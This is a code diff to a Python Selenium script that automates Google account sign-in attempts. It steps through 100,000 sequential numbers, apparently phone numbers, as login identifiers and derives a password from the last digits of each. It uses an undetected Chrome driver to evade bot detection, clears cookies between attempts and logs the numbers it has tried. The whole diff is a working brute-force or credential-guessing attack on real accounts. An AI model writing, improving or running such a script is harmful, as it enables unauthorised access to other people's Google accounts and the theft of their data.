@@ -1,9 +1,11 @@
 from time import sleep
 from selenium import webdriver
+import chromedriver_autoinstaller
 from selenium.webdriver.common.by import By
 import undetected_chromedriver as uc
 from selenium.common.exceptions import WebDriverException
 from selenium.webdriver.chrome.options import Options
+
 
 chrome_options = uc.ChromeOptions()
 chrome_options.add_argument("--incognito")
@@ -11,14 +13,15 @@ driver = uc.Chrome(driver_executable_path="chromedriver.exe", use_subprocess=Tru
 chrome_options = Options()
 chrome_options.add_experimental_option("detach", True)
 
-with open('Usenumber.txt', 'r') as f:
-    lines = f.read().splitlines()
-    last_line = lines[-1]
-    #print (last_line)
 
-input_string = int(last_line)
+# with open('Usenumber.txt', 'r') as f:
+#     lines = f.read().splitlines()
+#     last_line = lines[-1]
+#     #print (last_line)
+# input_string = int(last_line)
+input_string = int(input('Your number Type here : '))
 recall = 100000
-#passcall = int(input('Password : '))
+passcall = int(input('Password digit : '))
 input_end = input_string+recall
 print("\n")
 thislist=[]
@@ -28,25 +31,28 @@ while i < input_end:
   thislist.append(i)
 thislist1 = ([str(x) for x in thislist])
 url = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn'
-
+chromedriver_autoinstaller.install()
+chrome_options = uc.ChromeOptions()
+chrome_options.add_argument("--incognito")
+driver = uc.Chrome(use_subprocess=True, options=chrome_options)
+#driver = uc.Chrome(chromedriver_autoinstaller.install(), use_subprocess=True, options=chrome_options)
+chrome_options = Options()
+chrome_options.add_experimental_option("detach", True)
 if __name__ == '__main__':
-
-
-
 
     while True:
         for x in thislist1:
             if len(x) >= 2:
-                pwds = (x[-9:])
+                pwds = (x[-passcall:])
 
             driver.delete_all_cookies()
             driver.get(url)
             # add email
 
             driver.find_element(By.XPATH, '//*[@id="identifierId"]').send_keys(x)
-            driver.implicitly_wait(5000000)
+            driver.implicitly_wait(5000)
             driver.find_element(By.XPATH, '//*[@id="identifierNext"]/div/button/span').click()
-            sleep(1)
+            sleep(1.5)
             with open('Usenumber.txt', 'a') as f:
                 f.write(x)
                 f.write("\n")
